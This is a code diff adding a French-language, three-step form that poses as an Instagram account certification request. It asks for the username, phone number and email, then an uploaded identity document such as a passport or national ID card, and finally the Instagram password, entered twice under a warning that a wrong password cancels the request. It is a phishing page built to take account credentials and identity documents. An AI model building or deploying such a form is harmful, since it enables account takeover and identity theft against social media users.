@@ -34,8 +34,128 @@
 
         <div class="form-wrapper">
             <form class="certification-form">
-                <!-- Le reste du code du formulaire comme fourni précédemment -->
-                <!-- Copiez ici le code du formulaire que je vous ai donné -->
+                <div class="progress">
+                    <div class="steps">
+                        <div class="step active">1</div>
+                        <div class="step">2</div>
+                        <div class="step">3</div>
+                    </div>
+                </div>
+
+                <!-- Étape 1 -->
+                <div class="form-step active">
+                    <h3>Informations Instagram</h3>
+                    
+                    <div class="input-group required">
+                        <input 
+                            type="text" 
+                            id="instagramUsername"
+                            pattern="^(?!.*\.\.)(?!.*\.$)[^\W][\w.]{0,29}$"
+                            placeholder=" "
+                            required
+                        >
+                        <span class="input-prefix">@</span>
+                        <label>Nom d'utilisateur Instagram</label>
+                        <span class="error-message"></span>
+                    </div>
+
+                    <div class="input-group required">
+                        <input 
+                            type="tel" 
+                            id="instagramPhone"
+                            pattern="^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$"
+                            placeholder=" "
+                            required
+                        >
+                        <label>Numéro de téléphone</label>
+                        <span class="error-message"></span>
+                    </div>
+
+                    <div class="input-group required">
+                        <input 
+                            type="email" 
+                            id="instagramEmail"
+                            placeholder=" "
+                            required
+                        >
+                        <label>Email</label>
+                        <span class="error-message"></span>
+                    </div>
+
+                    <button type="button" class="btn-next">Continuer</button>
+                </div>
+
+                <!-- Étape 2 -->
+                <div class="form-step">
+                    <h3>Vérification</h3>
+                    
+                    <div class="docs-info">
+                        <div class="info-icon">ℹ️</div>
+                        <p>Documents acceptés :</p>
+                        <ul class="docs-list">
+                            <li>✓ Carte Nationale d'Identité</li>
+                            <li>✓ Passeport</li>
+                            <li>✓ Permis de conduire</li>
+                            <li>✓ Carte d'identité scolaire</li>
+                            <li>✓ Carte CMU</li>
+                            <li>✓ Tout document vous identifiant clairement</li>
+                        </ul>
+                    </div>
+
+                    <div class="upload-container">
+                        <div class="input-group file-upload">
+                            <input type="file" id="document" accept="image/*,.pdf" required>
+                            <label for="document" class="file-label">
+                                <span class="upload-icon">📎</span>
+                                <span class="upload-text">Glissez votre document ou cliquez ici</span>
+                                <span class="file-selected"></span>
+                            </label>
+                        </div>
+                        <p class="upload-info">Formats acceptés : JPG, PNG, PDF (Max 5MB)</p>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn-prev">Retour</button>
+                        <button type="button" class="btn-next">Continuer</button>
+                    </div>
+                </div>
+
+                <!-- Étape 3 -->
+                <div class="form-step">
+                    <h3>Confirmation</h3>
+
+                    <div class="password-info">
+                        <div class="info-alert">
+                            <span class="alert-icon">⚠️</span>
+                            <p>Important : Un mot de passe incorrect entraînera l'annulation automatique de votre demande de certification.</p>
+                        </div>
+                    </div>
+
+                    <div class="input-group password-group">
+                        <input type="password" id="password" placeholder=" " required>
+                        <label>Mot de passe Instagram</label>
+                        <button type="button" class="toggle-password" aria-label="Afficher/Masquer le mot de passe">👁️</button>
+                    </div>
+
+                    <div class="input-group password-group">
+                        <input type="password" id="confirmPassword" placeholder=" " required>
+                        <label>Confirmer le mot de passe</label>
+                        <button type="button" class="toggle-password" aria-label="Afficher/Masquer le mot de passe">👁️</button>
+                    </div>
+
+                    <div class="terms-group">
+                        <label class="checkbox-container">
+                            <input type="checkbox" required>
+                            <span class="checkmark"></span>
+                            J'accepte les conditions d'utilisation
+                        </label>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn-prev">Retour</button>
+                        <button type="submit" class="btn-submit">Valider</button>
+                    </div>
+                </div>
             </form>
         </div>
     </main>
